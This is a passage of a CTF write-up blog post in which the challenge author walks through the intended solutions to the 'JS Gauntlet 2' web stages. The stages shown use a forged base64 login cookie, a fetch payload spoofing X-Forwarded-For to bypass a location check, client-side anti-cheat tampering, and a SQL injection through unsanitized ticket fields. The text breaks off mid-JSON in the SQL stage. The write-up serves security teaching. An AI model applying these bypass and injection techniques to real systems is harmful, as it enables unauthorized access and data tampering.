<!doctype html>
<html lang="en">
    <head>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <title>
            Alex Prosser - RazorHack CTF 2024 - JS Gauntlet 2 and hogCAPTCHA
            Write-up
        </title>
        <link
            href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.1/dist/css/bootstrap.min.css"
            rel="stylesheet"
            integrity="sha384-iYQeCzEYFbKjA/T2uDLTpkwGzCiq6soy8tYaI1GyVh/UjpbCx/TYkiZhlZB6+fzT"
            crossorigin="anonymous"
        />
        <link href="\static\css\main.css" rel="stylesheet" />
        <link
            rel="apple-touch-icon"
            sizes="180x180"
            href="\static\res\favicon\apple-touch-icon.png"
        />
        <link
            rel="icon"
            type="image/png"
            sizes="32x32"
            href="\static\res\favicon\favicon-32x32.png"
        />
        <link
            rel="icon"
            type="image/png"
            sizes="16x16"
            href="\static\res\favicon\favicon-16x16.png"
        />
        <link rel="manifest" href="\static\res\favicon\site.webmanifest" />
        <link rel="shortcut icon" href="\static\res\favicon\favicon.ico" />
        <meta name="msapplication-TileColor" content="#da532c" />
        <meta
            name="msapplication-config"
            content="\static\res\favicon\browserconfig.xml"
        />
        <meta name="theme-color" content="#ffffff" />
        <script
            src="https://kit.fontawesome.com/b49a508af5.js"
            crossorigin="anonymous"
        ></script>
        <script src="\static\js\circles.js" defer></script>
        <link rel="stylesheet" href="\static\css\post.css" />
        <link
            rel="stylesheet"
            href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/default.min.css"
        />
        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
    </head>

    <body>
        <div class="container">
            <nav class="navbar-custom navbar navbar-expand-lg">
                <a class="navbar-brand nav-link-custom" href="/">
                    <img
                        src="\static\res\logo.png"
                        alt="Logo"
                        width="32"
                        height="32"
                        class="d-inline-block align-text-middle"
                    />
                    Alex Prosser
                </a>
                <button
                    class="navbar-toggler"
                    type="button"
                    data-bs-toggle="collapse"
                    data-bs-target="#navbarSupportedContent"
                    aria-controls="navbarSupportedContent"
                    aria-expanded="false"
                    aria-label="Toggle navigation"
                >
                    <span class="navbar-toggler-icon"></span>
                </button>
                <div
                    class="collapse navbar-collapse"
                    id="navbarSupportedContent"
                >
                    <ul class="navbar-nav ms-auto mb-2 mb-lg-0">
                        <li class="nav-item">
                            <a class="nav-link nav-link-custom" href="/blog"
                                >Blog</a
                            >
                        </li>
                        <li class="nav-item">
                            <a class="nav-link nav-link-custom" href="/projects"
                                >Projects</a
                            >
                        </li>
                        <li class="nav-item">
                            <a class="nav-link nav-link-custom" href="/contact"
                                >Contact</a
                            >
                        </li>
                    </ul>
                </div>
            </nav>

            <div id="circle-container"></div>

            <div class="jumbotron jumbotron-custom pb-4">
                <h2>
                    RazorHack CTF 2024 - JS Gauntlet 2 and hogCAPTCHA Write-up
                </h2>
                <h5>by Alex Prosser | 10/30/2024</h5>
            </div>

            <article class="pb-4">
                <p>
                    Hello all! This post will be going over the sequel to my
                    previous year's challenge, JS Gauntlet 2. I wanted to create
                    more web challenges this year as I have transitioned into a
                    web developer position at my workplace. Because of this, I
                    decided that I would combine a traditional Web CTF
                    challenge, with web exploits like SQL injection and request
                    spoofing, with some of my creativity from last year, where I
                    wanted to try to challenge people with only client-side(ish)
                    JavaScript. The result was a 8-stage competition that,
                    sadly, no one fully completed. I will go over the intended
                    solutions, some stats, and what made me create such a
                    convoluted mess.
                </p>
                <hr />
                <h3>Introduction</h3>
                <div style="text-align: center">
                    <p>
                        <a href="https://github.com/CodingAP/js-gauntlet-2"
                            >Link to GitHub</a
                        >
                    </p>
                </div>
                <p>
                    <em
                        ><strong
                            >We have received a message from a hacker group
                            called R3n3gad3s that has seemed to taken over our
                            communications systems. These systems allow us to
                            not only communicate with our different power
                            stations around the nations, but also our messages
                            and calls as well! It seems like they are about to
                            put it up for ransom, but we will not allow that!
                            However, we seem to have little experience in the
                            offensive side of this type of stuff... can you help
                            us?</strong
                        ></em
                    >
                    <em><strong>~ IT Team</strong></em>
                </p>
                <p>
                    This was the first message that people saw when looking at
                    the work order, which was an attempt to try to turn it to an
                    offensive attack where you save the system. Typically, I've
                    seen it where you just attack a website because you are told
                    to. But, I wanted it to seem like you were on the "good"
                    side (tbf it is all relative, but that is a political can of
                    worms that is not worth it). Also, it lined up with the main
                    storyline of the CTF that you were being attacked by an
                    external force. This led to the first stage...
                </p>
                <hr />
                <h3>A Secret Code</h3>
                <p>
                    <em
                        ><strong
                            >Well, it seems like that they expected us... They
                            have locked our main dashboard out with a code of
                            some sorts! How will we get around this? It has to
                            be airtight security, right?</strong
                        ></em
                    >
                    <em><strong>~ Sven from IT</strong></em>
                </p>
                <p><em>Solved: 21/33</em></p>
                <p>
                    The first thing I wanted to point out is that there is an IT
                    team with names here, as they are the ones presenting you
                    with what is happening. They don't seem to do anything, they
                    just pile your work plate up and hope that you can
                    accomplish it all. Anyways, this first challenge shows a
                    typical login screen with username and password inputs, but
                    it is being covered by a hacker overlay. Spoilers, this is
                    going to be a running theme. You cannot delete this element
                    as it will detect it and refresh the page (although you can
                    easily get around that, the login page doesn't work so eh).
                    The website says:
                    <strong
                        >This site has been compromised by the R3n3gad3s. Please
                        stay put for further messages...</strong
                    >
                </p>
                <div style="text-align: center; padding-bottom: 20px">
                    <img
                        src="\static\res\blog\razorhack-ctf-2024\js-gauntlet-2\a-secret-code-1.jpg"
                        style="width: 100%"
                    />
                </div>
                <p>
                    Looking into the page source, we see a Russian comment that
                    says in English:
                    <strong
                        >They thought they could fool us with shitty power
                        solutions, so we had to teach them. Fortunately, since
                        we are uber hackers, we took over. For other comrades,
                        please use the key code provided on Telegram.</strong
                    >. In a script tag, we also see a large checksum value and
                    an key event listener...
                </p>
                <pre><code class="hljs language-javascript"><span class="hljs-keyword">const</span> checksum = <span class="hljs-string">'Vm0wd2QyVkZOVWRpUm1ScFVtMW9WVll3Wkc...'</span>;
<span class="hljs-keyword">let</span> currentCode = <span class="hljs-string">''</span>, currentKeys = [];

<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'keydown'</span>, <span class="hljs-function"><span class="hljs-params">event</span> =></span> {
    currentCode += event.<span class="hljs-property">key</span>;
    currentKeys.<span class="hljs-title function_">push</span>(event.<span class="hljs-property">key</span>);
    currentCode = <span class="hljs-title function_">btoa</span>(currentCode);

    <span class="hljs-keyword">if</span> (checksum == currentCode) {
        <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/stage1/check'</span>, {
            <span class="hljs-attr">method</span>: <span class="hljs-string">'post'</span>,
            <span class="hljs-attr">headers</span>: {
                <span class="hljs-string">'content-type'</span>: <span class="hljs-string">'application/json'</span>
            },
            <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(currentKeys)
        })
        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =></span> response.<span class="hljs-title function_">json</span>())
        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =></span> {
            <span class="hljs-keyword">if</span> (data.<span class="hljs-property">flag</span> != <span class="hljs-literal">null</span>) {
                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'#flag-response'</span>).<span class="hljs-property">innerHTML</span> =
                <span class="hljs-string">`Welcome comrade! <span class="hljs-subst">${data.flag}</span>...`</span>;
            }
        });
    }
});
</code></pre>
                <p>
                    As you can see, the key pressed is added to the string and a
                    <em>btoa()</em> is used to encode the string into base64.
                    This happens for each key press and when
                    <em>currentCode</em> equals the large checksum, it sends a
                    request for the flag. The keys that were pressed are also
                    sent in the request to make sure you actually figured out
                    the keys and can't just abuse the endpoint. The intended
                    solution is to reverse the checksum with <em>atob()</em> and
                    getting each key after each decode. So, it would look
                    something like this...
                </p>
                <pre><code class="hljs language-javascript">> <span class="hljs-title function_">atob</span>(checksum)
<span class="hljs-string">'Vm0wd2VFNUdiRmRp...hV2RvZEE9PWI=a'</span> <span class="hljs-comment">// the key is 'a'</span>
<span class="hljs-comment">// remove 'a' from checksum</span>
> <span class="hljs-title function_">atob</span>(checksum)
<span class="hljs-string">'Vm0weE5GbFdiRmhU...yb3dSaWdodA==b'</span> <span class="hljs-comment">// the key is 'b'</span>
<span class="hljs-comment">// remove 'b' from checksum</span>
<span class="hljs-comment">// ...</span>
> <span class="hljs-title function_">atob</span>(checksum)
<span class="hljs-string">'QXJyb3dVcA==ArrowUp'</span> <span class="hljs-comment">// the key is the up arrow</span>
<span class="hljs-comment">// remove 'ArrowUp' from checksum</span>
> <span class="hljs-title function_">atob</span>(checksum)
<span class="hljs-string">'ArrowUp'</span> <span class="hljs-comment">// the key is the up arrow</span>
</code></pre>
                <p>
                    After decoding ten times, you get the keys
                    <em
                        >a, b, ArrowRight, ArrowLeft, ArrowRight, ArrowLeft,
                        ArrowDown, ArrowDown, ArrowUp, ArrowUp</em
                    >, which if you don't know is the Konami Code. It is
                    backwards because when reversing the checksum, you get the
                    last key pressed each time. Entering the code on the page
                    will return the the string
                    <strong
                        >Welcome comrade!
                        flag{30_lives_for_you_38201}...</strong
                    >
                </p>
                <div style="text-align: center; padding-bottom: 20px">
                    <img
                        src="\static\res\blog\razorhack-ctf-2024\js-gauntlet-2\a-secret-code-2.jpg"
                        style="width: 100%"
                    />
                </div>
                <hr />
                <h3>How Did You Get In Here?</h3>
                <p>
                    <em
                        ><strong
                            >Ok, now that we can actually see what is happening,
                            I've just realized that a lot of our system is
                            modularized, and they isolated it all. We just need
                            to recover it all, starting with our account system.
                            Find a way to get access to our admin accounts, and
                            we can definitely get somewhere...</strong
                        ></em
                    >
                    <em><strong>~ Justin from IT</strong></em>
                </p>
                <p><em>Solved: 10/33</em></p>
                <p>
                    The next challenge allows you to access the login page with
                    a username and password, but each time you try to login, you
                    receive an error message:
                    <strong
                        >Logins have been disabled by R3n3gad3s, but don't use
                        password 'jobbin_pobbins'!</strong
                    >
                    Sadly, no matter what username or password you try to enter,
                    though, it will not work. The Russian comment in the source
                    says:
                    <strong
                        >Hello, we have disabled the login system, so for other
                        team members trying to log in, please use this cookie as
                        a workaround. The typical login system won't work, so
                        don't use it. Cookie:
                        'account=eyJhY2NvdW50X25hbWUiOiJyM24zZ2FkM3MiLCJhY2NvdW50X3Bhc3N3b3JkIjoiW1JFREFDVEVEXSJ9'</strong
                    >
                </p>
                <div style="text-align: center; padding-bottom: 20px">
                    <img
                        src="\static\res\blog\razorhack-ctf-2024\js-gauntlet-2\how-did-you-get-in-here-1.jpg"
                        style="width: 100%"
                    />
                </div>
                <p>
                    This heavily hints at a cookie modification, so opening the
                    DevTools, we can edit the cookies on the webpage. A lot of
                    people thought the session cookie was the one needed to be
                    modified, but that only tracks the progress of the user and
                    is not part of the challenge (I made sure that it was known
                    after seeing it a couple of times). The comment aludes the
                    the cookie needing to be called <em>account</em>, but if you
                    just try to place the cookie in, it will not work. Decoding
                    the cookie from base64 gives you this...
                </p>
                <pre><code class="hljs language-json"><span class="hljs-punctuation">{</span><span class="hljs-attr">"account_name"</span><span class="hljs-punctuation">:</span><span class="hljs-string">"r3n3gad3s"</span><span class="hljs-punctuation">,</span><span class="hljs-attr">"account_password"</span><span class="hljs-punctuation">:</span><span class="hljs-string">"[REDACTED]"</span><span class="hljs-punctuation">}</span>
</code></pre>
                <p>
                    Makes sense, now. However, we were given something in the
                    form of <em>jobbin_pobbins</em>, so if we were to put that
                    password in and encode it back to base64...
                </p>
                <pre><code class="hljs language-javascript">cookie = {<span class="hljs-string">"account_name"</span>:<span class="hljs-string">"r3n3gad3s"</span>,<span class="hljs-string">"account_password"</span>:<span class="hljs-string">"jobbin_pobbins"</span>}
<span class="hljs-title function_">btoa</span>(cookie)
<span class="hljs-comment">// eyJhY2NvdW50X25hbWUiOiJyM24zZ2FkM3MiLCJhY2NvdW50X3Bhc3N3b3JkIjoiam9iYmluX3BvYmJpbnMifQ==</span>
</code></pre>
                <p>
                    Setting the cookie to this shows the flag:
                    <strong>flag{clipping_through_the_bars_17493}</strong>
                </p>
                <div style="text-align: center; padding-bottom: 20px">
                    <img
                        src="\static\res\blog\razorhack-ctf-2024\js-gauntlet-2\how-did-you-get-in-here-2.jpg"
                        style="width: 100%"
                    />
                </div>
                <hr />
                <h3>Irresistible Force</h3>
                <p>
                    <em
                        ><strong
                            >Ok, this seems like a crazy joke, but for us to get
                            to our next system, we need to... play Pong.
                            However, it seems like no one on the team can
                            actually beat the bot they've programmed in. This
                            feels embarassing to ask, but see what you can
                            do.</strong
                        ></em
                    >
                    <em><strong>~ John from IT</strong></em>
                </p>
                <p><em>Solved: 7/33</em></p>
                <p>
                    Ok, this one was fun to make. I knew that I wanted to make a
                    hackable game as a challenge, and it was one of my original
                    ones to make a set of challenges. However, with all the
                    challenges I planned, it was one of the first to be put on
                    the cutting board. Not all my ideas were immediately
                    shelved, as I reused them in other challenges, such as this
                    one. The Russian comment said:
                    <strong
                        >It was fun to do, but now it's time to get serious.
                        We're not going to let those bastards get by, so I've
                        made sure to add anti-cheat technology. I'm sure there
                        are no cracks in the system, so use the method described
                        in Telegram to use the system if necessary.</strong
                    >
                </p>
                <div style="text-align: center; padding-bottom: 20px">
                    <img
                        src="\static\res\blog\razorhack-ctf-2024\js-gauntlet-2\irresistible-force-1.jpg"
                        style="width: 100%"
                    />
                </div>
                <p>
                    The page consists of a game of Pong where the player must
                    score 5 points to continue. However, the bot in the game is
                    unbeatable in the traditional sense. No matter what, the bot
                    will always hit the ball, and there is no way to modify the
                    client code as I put it in an anonymous function (you can
                    delete it, but then you can't play the game then). There are
                    exposed variables, however, that you can modify. They just
                    happen to be obfuscated so you don't know what variable does
                    what. The intended solution can go many ways as I only added
                    a couple of anti-cheats. Those are:
                </p>
                <ul>
                    <li>
                        Changing the player or computer's score by more than one
                        point
                    </li>
                    <li>Moving the ball too far or out of bounds</li>
                    <li>Trying to use the endpoint without proper fields</li>
                    <li>Spamming scores too fast</li>
                </ul>
                <p>
                    Each of these infractions will lead to a 5 minute timeout.
                    You can get around it by either deleting your cookie and
                    starting the challenge over, which can be a little
                    inconvientent, but it is at least faster than waiting. If
                    you find a way to score around these anti-cheat methods, you
                    did it right!
                </p>
                <p>Here is the mapping for the variables:</p>
                <pre><code class="hljs language-javascript"><span class="hljs-keyword">let</span> var_46, var_70; <span class="hljs-comment">// player paddle position, computer paddle position</span>
<span class="hljs-keyword">let</span> var_68, var_04, var_20; <span class="hljs-comment">// paddle width, paddle height, paddle distance from edge</span>
<span class="hljs-keyword">let</span> var_29, var_77; <span class="hljs-comment">// ball x position, ball y position</span>
<span class="hljs-keyword">let</span> var_01, var_75; <span class="hljs-comment">// ball x speed, ball y speed</span>
<span class="hljs-keyword">let</span> var_80; <span class="hljs-comment">// ball size</span>
<span class="hljs-keyword">let</span> var_07, var_45; <span class="hljs-comment">// player input up, player input down</span>
<span class="hljs-keyword">let</span> var_62, var_95; <span class="hljs-comment">// player score, computer score</span>
<span class="hljs-keyword">let</span> var_03; <span class="hljs-comment">// game paused</span>
</code></pre>
                <p>
                    My personal solution is to set <em>var_20</em>, or the
                    paddle distance to a high value to switch places with the
                    player's paddle and the computer's paddle. I can move my
                    paddle out of the way and score on the computer. Other
                    solutions I have seen is to disable collision, somehow. I'm
                    not sure how they did that, but it works so... whatever.
                    After scoring 5 points, the flag will appear:
                    <strong>flag{hey_stop_looking_there_23912}</strong>
                </p>
                <div style="text-align: center; padding-bottom: 20px">
                    <img
                        src="\static\res\blog\razorhack-ctf-2024\js-gauntlet-2\irresistible-force-2.jpg"
                        style="width: 100%"
                    />
                </div>
                <hr />
                <h3>Teleportation</h3>
                <p>
                    <em
                        ><strong
                            >Who would have that they would have attached a VPN
                            to all of our services, so now we can't access the
                            warning services without being in the right
                            location. While it would be cool to travel for a
                            "vacation", I think we are going to do this on the
                            cheap. Now the obvious question is what location,
                            but a better question is why ask us?</strong
                        ></em
                    >
                    <em><strong>~ Stanley from IT</strong></em>
                </p>
                <p><em>Solved: 3/33</em></p>
                <p>
                    For this stage, we now have access to the IT dashboard,
                    which for a dashboard for all of IT's functions, it is
                    pretty bare bones (make sense why they can't do much for
                    you). The Russian comment says:
                    <strong
                        >I decided to hide my IP address now because apparently
                        previous posts were leaked to the site. I don't know how
                        it happened, but I hope it doesn't lead to problems in
                        the future.</strong
                    >
                    In the previous 3 stages, the comment was prefixed with an
                    IP of <em>194.242.26.157</em> (an actual Russian IP), but
                    now it is censored.
                </p>
                <div style="text-align: center; padding-bottom: 20px">
                    <img
                        src="\static\res\blog\razorhack-ctf-2024\js-gauntlet-2\teleportation-1.jpg"
                        style="width: 100%"
                    />
                </div>
                <p>
                    You have 4 buttons that do different actions such as create
                    a ticket or seeing the notifications. However, they are all
                    disabled as alluded to in the challenge prompt because
                    <strong>You are not in the correct location!</strong>. This
                    prompts you to try to change the location somehow,
                    especially since you have a Russian IP you can base it from.
                    While location services could have been a cool time, because
                    of how varied the implementations can be, I decided to go
                    for the "X-Forwarded-For" header, which has been out of use
                    for a little bit. This HTTP header allows the client to say
                    from what IP the request came from. Because you can change
                    this, it obviously became a security concern that you can so
                    easily spoof IPs, which means that you can spoof locations.
                    With this payload...
                </p>
                <pre><code class="hljs language-javascript"><span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/stage4/request'</span>, {
    <span class="hljs-attr">method</span>: <span class="hljs-string">'post'</span>,
    <span class="hljs-attr">headers</span>: {
        <span class="hljs-string">'content-type'</span>: <span class="hljs-string">'application/json'</span>,
        <span class="hljs-string">'x-forwarded-for'</span>: <span class="hljs-string">'194.242.26.157'</span>
    },
    <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({ <span class="hljs-attr">id</span>: <span class="hljs-string">'lol'</span> })
})
.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =></span> response.<span class="hljs-title function_">json</span>())
.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =></span> { 
    <span class="hljs-keyword">if</span> (data.<span class="hljs-property">error</span>) {
        <span class="hljs-title function_">sendNotification</span>(<span class="hljs-literal">true</span>, data.<span class="hljs-property">error</span>);
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-title function_">sendNotification</span>(<span class="hljs-literal">false</span>, data.<span class="hljs-property">flag</span>);
    }
});
</code></pre>
                <p>
                    ...the flag will appear in the notification. Just be sure to
                    grab it before it goes away! The flag is
                    <strong>flag{so_no_headers_28013}</strong>
                </p>
                <div style="text-align: center; padding-bottom: 20px">
                    <img
                        src="\static\res\blog\razorhack-ctf-2024\js-gauntlet-2\teleportation-2.jpg"
                        style="width: 100%"
                    />
                </div>
                <hr />
                <h3>We Are Doing This Again?</h3>
                <p>
                    <em
                        ><strong
                            >I can't help feel a sense of deja vu, but maybe
                            because I went through a lot of corn mazes as a kid.
                            Anyways, this seems to be the megamaze of my
                            childhood dreams because it's 3D! I couldn't get
                            through much, so I'll let you figure it out
                            yourself...</strong
                        ></em
                    >
                    <em><strong>~ Sven from IT</strong></em>
                </p>
                <p><em>Solved: 1/33</em></p>
                <p>
                    If you say that this one looks familar, it because it is. I
                    decided to use some of the JS Gauntlet challenges from last
                    year because they were not attempted or completed much (I
                    think like 5 teams max actually attempted them). This is the
                    maze one from Challenge #3 from last year. However, I
                    decided to upgrade this maze from a crude 9x5 maze to a
                    10x10x10 3D maze! The Russian comment says:
                    <strong
                        >Hello all, this 3D maze is a bit of a bitch to
                        traverse, so I have given the solution to you here:
                        nnnnneesene[REDACTED]</strong
                    >. I decided to give a hint with the first floor of the maze
                    being done as it makes it more clear just the scope you are
                    dealing with.
                </p>
                <div style="text-align: center; padding-bottom: 20px">
                    <img
                        src="\static\res\blog\razorhack-ctf-2024\js-gauntlet-2\we-are-doing-this-again-1.jpg"
                        style="width: 100%"
                    />
                </div>
                <p>
                    Because I didn't want people to do it manually this time, I
                    made sure that it was big enough to stop people from going
                    all the way. I think the furthest people went manually was 3
                    levels before someone wrote the script for it. I also wanted
                    it to not be too taxing of a script, so I essentially made
                    10 2D mazes, then stacked the exits and entrances on top of
                    each other. Obviously, the intended solution is to write a
                    maze solving script. Here is my script that I wrote to solve
                    the maze with BFS, with the neighbors function essentially
                    being a web crawler (made in NodeJS).
                </p>
                <pre><code class="hljs language-javascript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">getPaths</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">currentPath</span>) => {
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`https://razorhack-js-gauntlet-2.chals.io/stage/5/<span class="hljs-subst">${currentPath}</span>`</span>, {
        <span class="hljs-attr">headers</span>: { cookie }
    })
    <span class="hljs-keyword">const</span> html = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">text</span>();

    <span class="hljs-keyword">let</span> paths = [];
    <span class="hljs-keyword">if</span> (html.<span class="hljs-title function_">toLowerCase</span>().<span class="hljs-title function_">includes</span>(<span class="hljs-string">'north'</span>)) paths.<span class="hljs-title function_">push</span>(<span class="hljs-string">'n'</span>);
    <span class="hljs-keyword">if</span> (html.<span class="hljs-title function_">toLowerCase</span>().<span class="hljs-title function_">includes</span>(<span class="hljs-string">'south'</span>)) paths.<span class="hljs-title function_">push</span>(<span class="hljs-string">'s'</span>);
    <span class="hljs-keyword">if</span> (html.<span class="hljs-title function_">toLowerCase</span>().<span class="hljs-title function_">includes</span>(<span class="hljs-string">'east'</span>)) paths.<span class="hljs-title function_">push</span>(<span class="hljs-string">'e'</span>);
    <span class="hljs-keyword">if</span> (html.<span class="hljs-title function_">toLowerCase</span>().<span class="hljs-title function_">includes</span>(<span class="hljs-string">'west'</span>)) paths.<span class="hljs-title function_">push</span>(<span class="hljs-string">'w'</span>);
    <span class="hljs-keyword">if</span> (html.<span class="hljs-title function_">toLowerCase</span>().<span class="hljs-title function_">includes</span>(<span class="hljs-string">'down'</span>)) paths.<span class="hljs-title function_">push</span>(<span class="hljs-string">'E'</span>);
    <span class="hljs-keyword">return</span> paths;
}

<span class="hljs-keyword">const</span> directions = {
    <span class="hljs-attr">n</span>: { <span class="hljs-attr">x</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">1</span> },
    <span class="hljs-attr">s</span>: { <span class="hljs-attr">x</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">y</span>: -<span class="hljs-number">1</span> },
    <span class="hljs-attr">e</span>: { <span class="hljs-attr">x</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">0</span> },
    <span class="hljs-attr">w</span>: { <span class="hljs-attr">x</span>: -<span class="hljs-number">1</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">0</span> }
}

<span class="hljs-keyword">let</span> queue = [{ <span class="hljs-attr">x</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">path</span>: <span class="hljs-string">''</span> }];
<span class="hljs-keyword">let</span> visited = { <span class="hljs-string">'0,0'</span>: <span class="hljs-literal">true</span> };
<span class="hljs-keyword">let</span> finalPath = <span class="hljs-string">''</span>;
<span class="hljs-keyword">let</span> level = <span class="hljs-number">1</span>;

<span class="hljs-keyword">while</span> (queue.<span class="hljs-property">length</span> != <span class="hljs-number">0</span>) {
    <span class="hljs-keyword">let</span> item = queue.<span class="hljs-title function_">shift</span>();

    <span class="hljs-keyword">const</span> paths = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getPaths</span>(finalPath + item.<span class="hljs-property">path</span>);
    <span class="hljs-keyword">if</span> (paths.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'E'</span>)) {
        finalPath += item.<span class="hljs-property">path</span> + <span class="hljs-string">'E'</span>; 
        queue = [{ <span class="hljs-attr">x</span>: item.<span class="hljs-property">x</span>, <span class="hljs-attr">y</span>: item.<span class="hljs-property">y</span>, <span class="hljs-attr">path</span>: <span class="hljs-string">''</span> }];
        visited = { [<span class="hljs-string">`<span class="hljs-subst">${item.x}</span>,<span class="hljs-subst">${item.y}</span>`</span>]: <span class="hljs-literal">true</span> };

        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'On Level:'</span>, ++level);

        <span class="hljs-keyword">continue</span>;
    }

    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i < paths.<span class="hljs-property">length</span>; i++) {
        <span class="hljs-keyword">let</span> newPosition = { <span class="hljs-attr">x</span>: item.<span class="hljs-property">x</span> + directions[paths[i]].<span class="hljs-property">x</span>, <span class="hljs-attr">y</span>: item.<span class="hljs-property">y</span> + directions[paths[i]].<span class="hljs-property">y</span> };
        <span class="hljs-keyword">if</span> (!visited[newPosition.<span class="hljs-property">x</span> + <span class="hljs-string">','</span> + newPosition.<span class="hljs-property">y</span>]) {
            visited[newPosition.<span class="hljs-property">x</span> + <span class="hljs-string">','</span> + newPosition.<span class="hljs-property">y</span>] = <span class="hljs-literal">true</span>;
            queue.<span class="hljs-title function_">push</span>({ <span class="hljs-attr">x</span>: newPosition.<span class="hljs-property">x</span>, <span class="hljs-attr">y</span>: newPosition.<span class="hljs-property">y</span>, <span class="hljs-attr">path</span>: item.<span class="hljs-property">path</span> + paths[i] });
        }
    }
}

finalPath = finalPath.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, finalPath.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(finalPath);
</code></pre>
                <p>
                    After running the script, it will give you the entire path
                    that you can paste into the URL. Then, the flag will appear:
                    <strong>flag{this_isnt_a_corn_maze_28131}</strong>.
                </p>
                <p>
                    If you would like to see the visual representation of the
                    maze, here is a
                    <a
                        href="\static\res\blog\razorhack-ctf-2024\js-gauntlet-2\maze.zip"
                        >zip file</a
                    >
                    with all of the layers with starts and ends labeled.
                </p>
                <div style="text-align: center; padding-bottom: 20px">
                    <img
                        src="\static\res\blog\razorhack-ctf-2024\js-gauntlet-2\we-are-doing-this-again-2.jpg"
                        style="width: 100%"
                    />
                </div>
                <hr />
                <h3>Best In Class</h3>
                <p>
                    <em
                        ><strong
                            >We have recovered a good amount of services of our
                            stuff, and that is good and all... But I see this as
                            an opportunity to progress further. We have an
                            internal system that checks how many IT tickets that
                            we have completed within the last month. Now, I am
                            no slacker, but my number are lower than they
                            should. In fact, I need just one more tickets to
                            reach the quota for the role of "Good IT Boy" for
                            the month. However, our manager is the only one who
                            can modify when a ticket is done as to prevent
                            misuse. Can you, you know, up that number
                            somehow?</strong
                        ></em
                    >
                    <em><strong>~ Stanley from IT</strong></em>
                </p>
                <p><em>Solved: 0/33</em></p>
                <p>
                    So for this challenge and the rest after, no one was able to
                    solve it. Only one team got to this point, so they are
                    considered the champions of JS Gauntlet 2. I didn't give
                    them anything like last year (I was tempted to give them the
                    hat I wore the entire time, but I don't think anyone wants a
                    cheap sweaty tophat as a prize). The Russian comment says:
                    <strong
                        >This seems like a nice system, so I didn't take it
                        down. A bit primitive, but I like its simplicity. I
                        could go ahead and modify everything that is here for
                        the hell of it, but I think that is not
                        necessary.</strong
                    >
                    This is because this stage isn't even for recovery, Stanley
                    just wants his numbers up!
                </p>
                <div style="text-align: center; padding-bottom: 20px">
                    <img
                        src="\static\res\blog\razorhack-ctf-2024\js-gauntlet-2\best-in-class-1.jpg"
                        style="width: 100%"
                    />
                </div>
                <p>
                    Looking into the Docker container, it seems like this
                    challenge was actually broken! The <em>/data</em> directory
                    wasn't copied over, so it wasn't able to create databases
                    for the users (or user). Now that sucks, but considering the
                    how the challenges went where only one team got to this
                    point, it seems like it went under the radar. Essentially,
                    each user that got to this point got their own SQLite
                    database with 100 tickets in them. All but one ticket was
                    complete, so we just need to find a way to complete the
                    ticket without admin access. Luckily, it seems like the
                    inputs in the <em>Create Ticket</em> dialog aren't
                    sanitized, client or server side. We can tell by running
                    this payload...
                </p>
                <div style="text-align: center; padding-bottom: 20px">
                    <img
                        src="\static\res\blog\razorhack-ctf-2024\js-gauntlet-2\best-in-class-2.jpg"
                        style="width: 75%"
                    />
                </div>
                <p>
                    ...and you will get this in the table in the
                    <em>List Tickets</em> dialog...
                </p>
                <div style="text-align: center; padding-bottom: 20px">
                    <img
                        src="\static\res\blog\razorhack-ctf-2024\js-gauntlet-2\best-in-class-3.jpg"
                        style="width: 75%"
                    />
                </div>
                <p>
                    This means that we are entering some trailing function call,
                    most likely an INSERT as we are creating a ticket. That
                    means that between the parenthesis and the -- (which are
                    comments in SQL), we can put any SQL code we want, such as
                    modifying all tickets to be complete. We can also see what
                    the table schema looks like by looking at what data is
                    returned when calling <em>list_tickets</em> endpoint.
                </p>
                <pre><code class="hljs language-json"><span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"TICKET_ID"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"TICKET_SUMMARY"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Network latency in office network"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"TICKET_DESCRIPTION"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"The office network is experiencing significant latency affecting all users."</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"TICKET_AUTHOR"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"John"</span><span class="hljs-punctuation">,</span>
